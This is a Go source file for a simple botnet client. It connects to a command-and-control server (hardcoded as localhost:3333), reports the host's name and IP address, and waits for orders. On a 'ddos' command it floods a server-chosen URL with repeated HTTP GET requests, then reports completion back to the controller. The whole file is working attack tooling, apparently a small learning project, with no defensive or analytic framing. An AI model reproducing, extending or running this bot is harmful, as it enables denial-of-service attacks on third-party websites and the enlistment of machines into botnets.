package main

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

const (
	CONN_HOST = "localhost"
	CONN_PORT = "3333"
	CONN_TYPE = "tcp"
)

func main() {

	// connect to this socket
	conn, _ := net.Dial(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println("connecting to server as hostname:", hostname)
	ip := getIp()
	fmt.Println("local ip:", ip)
	// send to socket
	fmt.Fprintf(conn, "[client connecting] - [date]: "+time.Now().Local().Format(time.UnixDate)+" - [hostname]: "+hostname+", [ip]: "+ip.String()+"\n")
	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			fmt.Println("server disconnected")
			os.Exit(1)
		}
		fmt.Println("Command from server: " + command)
		//fmt.Println(len(strings.Split(command, " ")))

		comm := strings.Split(command, " ")[0]
		switch comm {
		case "ddos":
			fmt.Println("url case, checking parameters")
			if len(strings.Split(command, " ")) < 3 {
				fmt.Println("not enought parameters")
				break
			}
			fmt.Println("url case")
			go ddos(command, conn, hostname)
		default:
			fmt.Println("default case, no specified command")
			fmt.Println("")
			fmt.Println("-- waiting for new orders --")
		}

	}

}

func ddos(command string, conn net.Conn, hostname string) {
	url := strings.Split(command, " ")[1]
	url = strings.TrimSpace(url)

	iterations := strings.Split(command, " ")[2]
	iterations = strings.TrimSpace(iterations)
	iter, err := strconv.Atoi(iterations)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("url to ddos: " + url)
	for i := 0; i < iter; i++ {
		fmt.Println(i)
		resp, err := http.Get(url)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(resp)
	}
	msg := "[hostname]: " + hostname + ", [msg]: iterations done, ddos ended" + "[date]: " + time.Now().Local().Format(time.UnixDate)
	fmt.Println(msg)
	fmt.Fprintf(conn, msg+"\n")
	fmt.Println("")
	fmt.Println("-- waiting for new orders --")
}

func getIp() net.IP {
	var ip net.IP
	ifaces, err := net.Interfaces()
	if err != nil {
		fmt.Println(err)
	}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			fmt.Println(err)
		}
		for _, addr := range addrs {
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
		}
	}
	return ip
}
